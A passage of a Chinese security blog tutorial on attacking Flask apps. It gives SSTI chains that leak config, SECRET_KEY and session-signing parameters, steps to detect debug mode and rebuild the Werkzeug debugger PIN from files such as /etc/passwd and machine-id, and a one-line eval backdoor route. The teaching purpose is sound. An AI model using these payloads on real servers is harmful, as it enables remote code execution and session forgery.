+<p>config 是 flask 中的一个全局对象，它代表当前配置实例，包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY 等敏感值。</p>
+<p>所以如果可以获取到 config，就可以直接拿到各种敏感数据。比如如果需要获取绝对 Web 根目录可以用 <code>config.root_path</code>；比如上面说的伪造 session 需要 secret_key，而 config 就有 secret_key。所以只要获取了 config 就可以伪造 session 了。</p>
+<p>如果存在 SSTI 那么直接 <code>&#123;&#123; config &#125;&#125;</code> 就可以了。当然，如果没法直接拿 config，可以用 mro 来找其他利用链，比如：</p>
+<ul>
+<li><code>url_for.__globals__['current_app'].config</code></li>
+<li><code>get_flashed_messages.__globals__['current_app'].config</code></li>
+<li><code>self.__dict__._TemplateReference__context.config</code>，这个就是 jinja2 自带的，在 jinja2 的 SSTI 中介绍过了</li>
+<li>...</li>
+</ul>
+<p>同样，类似的替换方式写个 dibber 的插件即可自动搜索。</p>
+<p>实在不行，先确定脚本的路径，再直接读源码也是 ok 的...</p>
+<p>上面有个结论，“只要拿到了 secret_key 就可以伪造 session”，这个说法并不是非常准确。因为通过上面的分析可知，session 的签名还取决于使用的密钥派生函数、salt 和 hash 算法，这三者只要替换掉一个，用现有的工具即使知道 secret_key 也是没法生成有效的 session 的。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/6e2d5367-8bab-4552-8d61-00a887643a46.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>所以这就是一个 ctf 的出题思路了：</p>
+<ol type="1">
+<li>题目的目的：伪造 root 的 session</li>
+<li>题目中存在 ssti</li>
+</ol>
+<p>由于可以直接拿到 secret_key，所以估计很多人直接开始伪造 session，然后发现 session 就是无效的...</p>
+<p>所以在用 flask 的时候，不妨换一个 salt，也没啥改造的成本。</p>
+<p>当然，如果存在 SSTI，那么是可以非常轻易地获取这三个信息的：</p>
+<ul>
+<li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.key_derivation</code></li>
+<li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.salt</code></li>
+<li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.digest_method</code></li>
+</ul>
+<p>确认这三个关键的信息之后，结合 secret_key 就可以伪造了。</p>
+<h3 id="利用-debug-模式姿势">利用 debug 模式姿势</h3>
+<p>flask 贴心地提供了 debug 模式，只需要加参数 <code>app.run(debug=True)</code> 即可，用于在测试的时候及时发现和定位问题。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e10d7f9a-f143-44b9-ba91-69d256e74ccf.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>黑盒判断是否开启 debug 模式，最直接的方式就是触发一个报错。除此之外还有一种方法：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-string">&quot;__debugger__&quot;</span> <span class="hljs-keyword">in</span> requests.get(<br>  <span class="hljs-string">&#x27;http://127.0.0.1:5000/?__debugger__=yes&amp;cmd=resource&amp;f=style.css&#x27;</span><br>).text<br></code></pre></td></tr></table></figure></p>
+<p><code>style.css</code> 位于 <code>site-packages/werkzeug/debug/shared/</code> 下，这里面所有的文件都可以用来判断。</p>
+<p>仔细观察可以发现，这个页面中有很多可以利用的地方。</p>
+<h4 id="信息泄露">信息泄露</h4>
+<p>这个页面中的报错所在代码是可以点击的，且是按照 Python 异常堆栈顺序排列，所以一般最后一行就是报错的原始代码。点击之后可以看到 10 行源代码，触发报错的代码在第 6 行。如果敏感信息正好在这个范围里，那么就会泄露出来。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4035a916-551c-401e-82af-35ba9c29bae1.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>按照这个思路，如果我们在 SSTI 的时候，发现是无回显的，那么也可以通过触发报错，然后在 debug 里获得结果。</p>
+<h4 id="利用报错解决无回显">利用报错解决无回显</h4>
+<p><code>eval</code> 或者 <code>exec</code> 我们想看到的数据即可：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f8424ba9-027e-4b36-91e9-7c83b333abf5.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h4 id="get-pin-get-shell">get PIN, get shell</h4>
+<p>在 debug 页面中甚至还提供了 python 的交互式 shell，方便 plus。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4f68d80e-9f35-48e8-b36c-2630db9ae36d.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>但前提是需要有 <code>Debugger PIN</code>：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/31eb9888-bbcd-4960-81db-6cd12bec694d.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这个在 debug 模式下启动 flask 的时候可以直接获取到（通常是在终端直接打印）。作为攻击者，是没法直接拿到这个 PIN 的。</p>
+<blockquote>
+<p>爆破 PIN</p>
+</blockquote>
+<p>最直接的办法就是爆破。可惜 flask 默认带有爆破防御功能，在 <code>site-packages/werkzeug/debug/__init__.py</code> 中的 <code>pin_auth</code>：</p>
+<ol type="1">
+<li>一旦检查 PIN 失败就会调用 <code>_fail_pin_auth</code>，让 <code>self._failed_pin_auth</code> 加 1</li>
+<li>如果 <code>self._failed_pin_auth &gt; 5</code>，每次认证返回响应前延时 5s</li>
+<li>如果 <code>self._failed_pin_auth &gt; 10</code>，强制停止 PIN 校验逻辑，只能重启服务来重置</li>
+</ol>
+<p>这里有个细节，由于 <code>_fail_pin_auth</code> 是 sleep 之后才 +1，所以理论上只要在 5s 内发出很多请求，那么可以在 +1 之前就经过很多次 PIN 验证。遗憾的是，flask PIN 一般都有 9 位数字，每位有 10 种可能性，也就是 10 亿种可能性，一共可以尝试 10 次，就算每次都延迟 5s，那么 50s 内需要发出 10 亿次尝试，这显然是不可能的。不过这个可以耗尽尝试次数导致别人也无法使用 debug，那么显然这是一个比较鸡肋的 DoS。</p>
+<p>所以爆破的路子走不通，我们需要寻找其他方式。</p>
+<p>通过分析 flask 源码可以拿到以下调用链，可以看出 PIN 的生成是相对固定的：</p>
+<ol type="1">
+<li>入口 py 文件 中的 <code>... .run()</code></li>
+<li><code>site-packages/flask/app.py</code> 中，<code>class Flask(Scaffold):</code> 下 <code>run</code> 的 <code>run_simple(host, port, self, **options)</code></li>
+<li><code>site-packages/werkzeug/serving.py</code> 中，<code>run_simple</code> 的 <code>application = DebuggedApplication(application, use_evalex)</code></li>
+<li><code>site-packages/werkzeug/debug/__init__.py</code> 中，<code>class DebuggedApplication:</code> 下 <code>pin</code> 的 <code>pin_cookie = get_pin_and_cookie_name(self.app)</code></li>
+<li><code>site-packages/werkzeug/debug/__init__.py</code> 中的<code>get_pin_and_cookie_name</code></li>
+</ol>
+<p><code>get_pin_and_cookie_name</code> 中，可以看到对 PIN 的处理有一些特殊的逻辑，见下面代码注释：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> getpass<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> typing <span class="hljs-keyword">as</span> t<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_machine_id</span>():<br>    <span class="hljs-comment"># --- linux 获取逻辑 ---</span><br>    linux = <span class="hljs-string">b&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/etc/machine-id&quot;</span>, <span class="hljs-string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                value = f.readline().strip()<br>        <span class="hljs-keyword">except</span> OSError:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> value:<br>            linux += value<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># 如果是容器，下面的逻辑可以用于区分不同容器</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/cgroup&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            linux += f.readline().strip().rpartition(<span class="hljs-string">b&quot;/&quot;</span>)[<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">except</span> OSError:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">if</span> linux:<br>        <span class="hljs-keyword">return</span> linux<br><br>    <span class="hljs-comment"># --- OS X 获取逻辑 ---</span><br>    <span class="hljs-comment"># 用 ioreg 去获取 machine guid</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># subprocess may not be available, e.g. Google App Engine</span><br>        <span class="hljs-comment"># https://github.com/pallets/werkzeug/issues/925</span><br>        <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen, PIPE<br><br>        dump = Popen(<br>            [<span class="hljs-string">&quot;ioreg&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>], stdout=PIPE<br>        ).communicate()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">except</span> (OSError, ImportError):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment"># --- Windows 获取逻辑 ---</span><br>    <span class="hljs-comment"># 用 winreg 去获取 machine guid</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">import</span> winreg<br>    <span class="hljs-keyword">except</span> ImportError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> winreg.OpenKey(<br>                winreg.HKEY_LOCAL_MACHINE,<br>                <span class="hljs-string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>,<br>                <span class="hljs-number">0</span>,<br>                winreg.KEY_READ | winreg.KEY_WOW64_64KEY,<br>            ) <span class="hljs-keyword">as</span> rk:<br>                guid, guid_type = winreg.QueryValueEx(rk, <span class="hljs-string">&quot;MachineGuid&quot;</span>)<br><br>                <span class="hljs-keyword">if</span> guid_type == winreg.REG_SZ:<br>                    <span class="hljs-keyword">return</span> guid.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>                <span class="hljs-keyword">return</span> guid<br><br>        <span class="hljs-keyword">except</span> OSError:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pin_and_cookie_name</span>(<span class="hljs-params">app</span>):<br>    <span class="hljs-comment"># 环境变量里的 WERKZEUG_DEBUG_PIN</span><br>    pin = os.environ.get(<span class="hljs-string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)<br>    rv = <span class="hljs-literal">None</span><br>    num = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> pin == <span class="hljs-string">&quot;off&quot;</span>:<br>        <span class="hljs-comment"># 此时无需填写 pin 即可使用 webshell</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> pin <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> pin.replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).isdigit():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> pin:<br>            <span class="hljs-comment"># 此时 pin 码就是 WERKZEUG_DEBUG_PIN 的值</span><br>            rv = pin<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 后面 len(num) 会作为 pin 码的长度</span><br>            num = pin<br><br>    <span class="hljs-comment"># 参数 1：</span><br>    <span class="hljs-comment"># 由于 flask 传入的固定是 flask.Flask()</span><br>    <span class="hljs-comment"># 所以这里的 modname 就是 &quot;flask.app&quot;</span><br>    modname = <span class="hljs-built_in">getattr</span>(<br>        app,<br>        <span class="hljs-string">&quot;__module__&quot;</span>,<br>        t.cast(<span class="hljs-built_in">object</span>, app).__class__.__module__<br>    )<br><br>    <span class="hljs-comment"># 参数 2：</span><br>    <span class="hljs-comment"># 这里获取的是系统的用户名</span><br>    <span class="hljs-comment"># 其实就是执行 whoami</span><br>    <span class="hljs-keyword">try</span>:<br>        username = getpass.getuser()<br>    <span class="hljs-keyword">except</span> (ImportError, KeyError):<br>        <span class="hljs-comment"># 有些特殊的情况下，UID 无法唯一关联到一个用户</span><br>        <span class="hljs-comment"># 就会报错，次数 username 就是 None</span><br>        <span class="hljs-comment"># 相关 issue 可见：</span><br>        <span class="hljs-comment"># https://github.com/pallets/werkzeug/issues/1471</span><br>        username = <span class="hljs-literal">None</span><br><br>    mod = sys.modules.get(modname)<br>    probably_public_bits = [<br>        username,  <span class="hljs-comment"># `whoami`</span><br>        modname,  <span class="hljs-comment"># &quot;flask.app&quot;</span><br>        <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&quot;__name__&quot;</span>, <span class="hljs-built_in">type</span>(app).__name__),  <span class="hljs-comment"># &quot;Flask&quot;</span><br><br>        <span class="hljs-comment"># 参数 3：</span><br>        <span class="hljs-comment"># 模块 modname 所在文件的完整系统路径</span><br>        <span class="hljs-comment"># 这里其实就是 app.py 所在的完整系统路径</span><br>        <span class="hljs-built_in">getattr</span>(mod, <span class="hljs-string">&quot;__file__&quot;</span>, <span class="hljs-literal">None</span>),<br>    ]<br><br>    <span class="hljs-comment"># 参数 4：</span><br>    <span class="hljs-comment"># 第一个值是服务器的 MAC 地址，它是一个 48 位正整数</span><br>    <span class="hljs-comment"># 第二个值是 get_machine_id()</span><br>    private_bits = [<span class="hljs-built_in">str</span>(uuid.getnode()), get_machine_id()]<br><br>    h = hashlib.sha1()<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>            bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>        h.update(bit)<br><br>    <span class="hljs-comment"># 参数 5：</span><br>    <span class="hljs-comment"># 固定值 cookiesalt</span><br>    h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>    <span class="hljs-comment"># 这个我们用不到</span><br>    cookie_name = <span class="hljs-string">f&quot;__wzd<span class="hljs-subst">&#123;h.hexdigest()[:<span class="hljs-number">20</span>]&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># 固定值 pinsalt</span><br>        h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br><br>        <span class="hljs-comment"># 这里长度永远是 9，一定是符合下面要求的长度</span><br>        num = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d&#125;</span>&quot;</span>[:<span class="hljs-number">9</span>]<br><br>    <span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># 将 num 拆解为 n 组，每组通过 &#x27;-&#x27; 连接</span><br>                <span class="hljs-comment"># n 必须为 [5, 4, 3] 的其中一个的倍数</span><br>                <span class="hljs-comment"># 否则认为 num 长度错误</span><br>                rv = <span class="hljs-string">&quot;-&quot;</span>.join(<br>                    num[x: x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>)<br>                    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>                )<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 长度错误的 num 会被直接置为 pin 码</span><br>            <span class="hljs-comment"># 只会出现在自定义了 WERKZEUG_DEBUG_PIN 的时候</span><br>            rv = num<br><br>    <span class="hljs-keyword">return</span> rv, cookie_name<br></code></pre></td></tr></table></figure>
+<p>所以一共有 9 个必要参数：</p>
+<ol type="1">
+<li>环境变量 <code>WERKZEUG_DEBUG_PIN</code>：非常重要的值，它本身可能就是 PIN 码，以及决定了后面生成 PIN 的流程。不过这个值一般不会修改</li>
+<li><code>probably_public_bits</code>，它是一个 4 元列表，其中包含：
+<ol type="1">
+<li><code>username</code>：运行 flask 所使用的的系统用户名</li>
+<li><code>modname</code>：在 flask 中，此值固定是 <code>"flask.app"</code></li>
+<li>固定值 <code>"Flask"</code></li>
+<li><code>app.py</code> 所在的完整系统路径</li>
+</ol></li>
+<li><code>private_bits</code>，它是一个 2 元列表，其中包含：
+<ol type="1">
+<li>MAC 地址（48 位正整数格式）</li>
+<li><code>Machine ID</code>：通常在系统安装或首次启动时从一个随机数源生成，并且之后不会自己发生变化；不同的操作系统获取的方式不同</li>
+</ol></li>
+<li>固定值 <code>"cookiesalt"</code></li>
+<li>固定值 <code>"pinsalt"</code></li>
+<li>将上面的结果进行 sha1，然后取前 9 位</li>
+<li>每 3 位一组，用 <code>-</code> 连接</li>
+</ol>
+<p>如果有办法在目标环境中执行 Python 代码，那么获取 PIN 是很简单的，可以直接调用 <code>get_pin_and_cookie_name</code> 来生成即可：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;werkzeug.debug&#x27;</span>,<br>    fromlist=[<span class="hljs-string">&#x27;&#x27;</span>]<br>).get_pin_and_cookie_name(<br>    <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>).app<br>)<br></code></pre></td></tr></table></figure></p>
+<p>例如通过 SSTI：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/59bbadda-e5d1-4fcf-b42d-6869f9858fb3.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>如果存在任意文件读取漏洞，则需要拿到非固定的值，可以通过特殊文件来获取：</p>
+<ol type="1">
+<li>环境变量 <code>WERKZEUG_DEBUG_PIN</code> 先无视</li>
+<li><code>username</code> 通过 <code>/etc/passwd</code> 来猜测</li>
+<li>app.py 的绝对路径在 debug 的报错中就有</li>
+<li>在 Linux 环境中，Mac 地址可以读取 <code>/sys/class/net/网卡名称/address</code>，删除 <code>:</code> 之后转为 10 进制即可，网卡名可以通过 <code>/proc/net/dev</code> 文件来查找</li>
+<li><code>Machine ID</code> 按照 <code>get_machine_id</code> 的逻辑来读取即可</li>
+</ol>
+<h3 id="内存马">内存马</h3>
+<p>在文档中我们可以发现 <code>flask.Flask</code> 有一些特殊的方法，可以修改处理请求的逻辑。</p>
+<h4 id="add_url_rule">add_url_rule</h4>
+<p><code>add_url_rule</code> 是用来注册路由的。</p>
+<p>根据官方文档，这三种写法是等价的：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 写法 1</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br><br><span class="hljs-comment"># 写法 2</span><br>app.add_url_rule(<span class="hljs-string">&quot;/&quot;</span>, endpoint=<span class="hljs-string">&quot;index&quot;</span>)<br><span class="hljs-meta">@app.endpoint(<span class="hljs-params"><span class="hljs-string">&quot;index&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br><br><span class="hljs-comment"># 写法 3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br>app.add_url_rule(<span class="hljs-string">&quot;/&quot;</span>, view_func=index)<br></code></pre></td></tr></table></figure></p>
+<p>这就意味着，如果变量 app 是可以控制的，那么我们可以通过 <code>app.add_url_rule("/shell", view_func=lambda: eval(request.args["cmd"]))</code> 来植入一个后门。</p>
+<p>在绑定的时候有几个需要注意的地方：</p>
+<ol type="1">
+<li>所有 url 所绑定的函数名称（即 endpoint）与函数的映射关系，可以通过 <code>app.view_functions</code> 看到</li>
+<li>绑定的时候，会将对应的 endpoint 保存至 <code>app.view_functions</code>，如果这个时候 endpoint 已经存在，但是新绑定的过程中改变了对应的函数，就会报错，比如 lambda：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/79aab4ed-d595-47f7-b936-be456042888d.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
+因为 lambda 每次执行都会新生成一个对象，并不是固定的：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/9b46cbf3-439f-4f43-8aab-fe1f8a9219aa.png!blog#width-zoom4" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
+<li>为了避免上面那个问题，可以手动指定 endpoint 的名称：<code>app.add_url_rule("/shell", "ep-1", view_func=lambda x: x)</code><br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/60d521fe-2b71-4c5a-816b-8a6e6891c83a.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
+<li>对于同一个 url，如果绑定了多次 endpoint，以第一次绑定的结果为准：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/00422668-1f0d-4814-bd95-264cbc56480b.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
+不过要修改也简单，可以通过 <code>app.view_functions</code> 修改<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/095c4a0c-92f2-4f68-ae0e-8dad90ff4f3f.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
+<li>上面也给了我们启发，通过 <code>app.view_functions</code> 即可篡改 url 所绑定的函数。</li>
+<li><code>app.url_map</code> 中保存了 url 与 endpoint 的对应关系。结合上面的结论大致可以推测出，<code>app.add_url_rule</code> 应该是依赖 <code>app.view_functions</code> 和 <code>app.url_map</code> 的。</li>
+<li>debug 模式下，如果直接调用 setup function 是没有办法使用的：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f7c723c3-adba-46f7-97ee-9faf6fd9d6ab.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
+代码位于 <code>site-packages/flask/scaffold.py</code> 中的 <code>def setupmethod</code> 下：<br />
